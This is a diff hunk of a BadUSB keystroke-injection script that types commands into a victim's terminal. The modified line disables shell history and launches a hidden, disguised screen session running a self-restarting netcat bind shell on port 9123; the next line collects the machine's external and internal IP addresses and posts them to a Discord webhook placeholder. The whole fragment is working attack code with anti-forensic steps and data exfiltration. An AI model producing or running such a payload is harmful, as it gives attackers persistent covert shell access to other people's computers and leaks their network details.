@@ -13,7 +13,7 @@ STRING terminal
 DELAY 1000
 ENTER
 DELAY 1000
-STRING screen -dmS upd_check bash -ic 'unset HISTFILE; set +o history; trap "rm -f /tmp/f; screen -S background_process -X quit; killall nc 2>/dev/null; kill -SIGINT $$" EXIT; while true; do rm /tmp/f || true; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 9123 >/tmp/f & sleep 300; pkill -f "nc -l 9123" 2>/dev/null && ps aux | awk "/bash -i/ && !/awk/ {print \$2}" | xargs kill -9; if [ -f /tmp/terminate ]; then break; fi; done'
+STRING unset HISTFILE; screen -dmS upd_check bash -ic 'unset HISTFILE; set +o history; trap "rm -f /tmp/f; screen -S background_process -X quit; killall nc 2>/dev/null; kill -SIGINT $$" EXIT; while true; do rm /tmp/f || true; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 9123 >/tmp/f & sleep 300; pkill -f "nc -l 9123" 2>/dev/null && ps aux | awk "/bash -i/ && !/awk/ {print \$2}" | xargs kill -9; if [ -f /tmp/terminate ]; then break; fi; done'
 DELAY 2000
 ENTER
 STRING external_ip=$(curl -s ifconfig.me); internal_ips=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | sed 's/inet //' | paste -sd "," -); json_payload="{\"content\": \"From Endless Reverse Shell BadUSB:\\nExternal IP: $external_ip\\nInternal IP(s): $(echo $internal_ips | sed 's/,/, /g')\\n----------------------------------------\"}"; curl -X POST -H "Content-Type: application/json" -d "$json_payload" "YOUR_DISCORD_CHANNEL_TOKEN" && unset external_ip internal_ips
